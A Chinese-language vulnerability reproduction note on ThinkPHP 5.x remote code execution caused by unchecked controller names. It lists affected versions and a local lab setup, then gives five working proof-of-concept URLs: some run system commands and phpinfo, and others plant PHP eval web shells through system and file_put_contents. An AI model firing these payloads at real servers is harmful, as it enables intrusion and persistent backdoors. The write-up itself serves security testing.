# ThinkPHP5.x 远程命令执行

Author: H3rmesk1t

Data: 2021.06.06

# 漏洞原因
由于框架对控制器名没有进行足够的检测，导致在没有开启强制路由(默认未开启)的情况下可能导致远程代码执行

# 漏洞影响版本
Thinkphp 5.x-Thinkphp 5.1.31
Thinkphp 5.0.x<=5.0.23

# 漏洞复现
## 搭建漏洞环境
官网下载Thinkphp 5.0.22，[下载地址](http://www.thinkphp.cn/donate/download/id/1260.html)
使用phpstudy搭建环境，解压下载的Thinkphp5.0.22到网站目录下，浏览器访问即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210606150355430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## POC1

```
http://localhost:9091/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210606171441823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## POC2&POC3

```
http://localhost:9091/public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```

```
http://localhost:9091/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210606171808985.png#pic_center)
## POC4&POC5

```
http://localhost:9091/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^%3C?php%20@eval($_POST[cmd]);?^%3E%20%3Eshell.php
```

```
http://localhost:9091/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=../test.php&vars[1][]=<?php @eval($_POST[test]);?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210606173015963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
